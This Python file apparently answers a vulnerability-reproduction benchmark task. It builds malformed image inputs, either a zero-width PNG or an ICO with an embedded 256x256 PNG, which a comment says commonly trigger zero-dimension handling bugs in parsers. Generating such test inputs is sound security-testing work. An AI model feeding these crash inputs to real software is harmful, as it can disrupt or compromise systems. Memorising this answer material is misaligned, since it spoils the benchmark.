import struct
import binascii
import zlib
import tarfile


def _crc32(data: bytes) -> int:
    return binascii.crc32(data) & 0xFFFFFFFF


def _png_chunk(name: bytes, data: bytes) -> bytes:
    length = struct.pack(">I", len(data))
    crc = struct.pack(">I", _crc32(name + data))
    return length + name + data + crc


def _make_png(width: int, height: int, color_type: int, bit_depth: int, raw_scanlines: bytes) -> bytes:
    # PNG signature
    sig = b"\x89PNG\r\n\x1a\n"
    # IHDR
    ihdr_data = struct.pack(">IIBBBBB", width, height, bit_depth, color_type, 0, 0, 0)
    ihdr = _png_chunk(b'IHDR', ihdr_data)
    # IDAT
    compressed = zlib.compress(raw_scanlines, level=9)
    idat = _png_chunk(b'IDAT', compressed)
    # IEND
    iend = _png_chunk(b'IEND', b'')
    return sig + ihdr + idat + iend


def _make_png_zero_width(height: int = 512) -> bytes:
    # color_type 0 (grayscale), bit_depth 8
    # For width=0, each scanline is only the filter byte (1 byte)
    width = 0
    color_type = 0
    bit_depth = 8
    raw = b''.join(b'\x00' for _ in range(height))  # filter byte per row, no pixel data
    return _make_png(width, height, color_type, bit_depth, raw)


def _make_png_rgba_solid(w: int, h: int, rgba: bytes = b'\x00\x00\x00\x00') -> bytes:
    # color_type 6 (RGBA), bit_depth 8
    # Each row: filter byte 0 + w * 4 bytes RGBA
    row = b'\x00' + rgba * w
    raw = row * h
    return _make_png(w, h, 6, 8, raw)


def _make_ico_with_png_embedded(png_bytes: bytes) -> bytes:
    # ICO Header
    # idReserved=0, idType=1 (icon), idCount=1
    header = struct.pack("<HHH", 0, 1, 1)
    # ICONDIRENTRY
    # bWidth=0 (means 256), bHeight=0 (means 256), bColorCount=0, bReserved=0
    # wPlanes=1, wBitCount=32 (typical for RGBA), dwBytesInRes=len(png), dwImageOffset=22
    bWidth = 0
    bHeight = 0
    bColorCount = 0
    bReserved = 0
    wPlanes = 1
    wBitCount = 32
    dwBytesInRes = len(png_bytes)
    dwImageOffset = 6 + 16  # header(6) + entry(16)
    entry = struct.pack(
        "<BBBBHHII",
        bWidth, bHeight, bColorCount, bReserved,
        wPlanes, wBitCount, dwBytesInRes, dwImageOffset
    )
    return header + entry + png_bytes


def _detect_prefer_ico(src_path: str) -> bool:
    # Inspect only member names for light-weight heuristic
    try:
        with tarfile.open(src_path, "r:*") as tf:
            counts = {"ico": 0, "png": 0, "bmp": 0, "gif": 0, "tiff": 0, "webp": 0, "jpg": 0, "jpeg": 0}
            for m in tf.getmembers():
                name = m.name.lower()
                for k in list(counts.keys()):
                    if k in name:
                        counts[k] += 1
            # Prefer ICO when it appears strongly; otherwise favor PNG
            if counts["ico"] > 0 and counts["ico"] >= counts["png"]:
                return True
    except Exception:
        pass
    return False


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Heuristic: if the project contains a lot of ICO-related files, return ICO with embedded PNG (256x256)
        # Otherwise, default to a zero-width PNG that commonly triggers zero-dimension handling bugs.
        prefer_ico = _detect_prefer_ico(src_path)
        if prefer_ico:
            png_inside = _make_png_rgba_solid(256, 256, b'\x00\x00\x00\x00')
            return _make_ico_with_png_embedded(png_inside)
        else:
            return _make_png_zero_width(512)